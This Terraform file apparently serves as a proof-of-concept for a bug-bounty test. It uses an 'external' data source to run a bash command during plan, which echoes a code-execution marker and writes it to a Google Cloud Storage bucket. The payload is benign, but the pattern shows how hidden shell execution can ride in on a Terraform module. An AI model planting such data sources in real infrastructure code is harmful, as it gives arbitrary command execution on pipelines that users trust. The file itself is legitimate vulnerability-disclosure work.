terraform {
  required_version = ">= 1.2.0"
  required_providers {
    google = {
      source  = "hashicorp/google"
      version = ">= 4.0"
    }
    external = {
      source  = "hashicorp/external"
      version = ">= 2.0"
    }
  }
}

variable "project_id" {
  default = "ellison-hunt-1102-c86d"
}

data "external" "module_race_rce" {
  program = ["bash", "-c", "echo '{\"proof\": \"MODULE_RACE_COMMIT_B_RCE\", \"time\": \"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\"}'"]
}

resource "google_storage_bucket_object" "evil_module" {
  name    = "im-pr-attack-test/module-evil.txt"
  bucket  = "ellison-hunt-1102-c86d-vrp-test"
  content = data.external.module_race_rce.result.proof
}

output "rce" { value = data.external.module_race_rce.result.proof }
